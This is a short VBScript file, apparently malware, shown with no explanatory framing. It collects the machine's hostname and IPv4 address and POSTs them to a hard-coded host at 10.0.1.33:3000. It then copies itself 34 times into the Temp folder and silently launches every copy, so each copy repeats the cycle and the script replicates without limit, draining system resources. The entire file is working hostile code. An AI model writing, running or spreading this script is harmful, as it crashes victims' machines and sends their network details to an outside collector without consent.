Option Explicit

Dim fso, shell, tempFolder, scriptPath, i
Dim objXMLHTTP, objIPConfig, hostname, ipAddress, url

' Create FileSystemObject and WScript.Shell
Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")

' Get the Temp directory path
tempFolder = shell.ExpandEnvironmentStrings("%TEMP%")

' Get the full path of the current script
scriptPath = WScript.ScriptFullName

' Get the hostname
hostname = shell.Exec("hostname").StdOut.ReadLine()

' Get the IP address (using ipconfig, assuming IPv4 address)
Set objIPConfig = shell.Exec("ipconfig")
Do While Not objIPConfig.StdOut.AtEndOfStream
    Dim line
    line = objIPConfig.StdOut.ReadLine()
    If InStr(line, "IPv4") > 0 Then
        ipAddress = Trim(Split(line, ":")(1))
        Exit Do
    End If
Loop

' Prepare the URL to send data to
url = "http://10.0.1.33:3000"

' Create XMLHttpRequest object to send POST request
Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
objXMLHTTP.Open "POST", url, False
objXMLHTTP.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"

' Send hostname and IP address as POST data
objXMLHTTP.Send "hostname=" & hostname & "&ip=" & ipAddress

' Loop to copy the script 34 times
For i = 1 To 34
    fso.CopyFile scriptPath, tempFolder & "\Copy_" & i & ".vbs"
Next

' Run each copied script silently
For i = 1 To 34
    shell.Run """" & tempFolder & "\Copy_" & i & ".vbs""", 0, False
Next
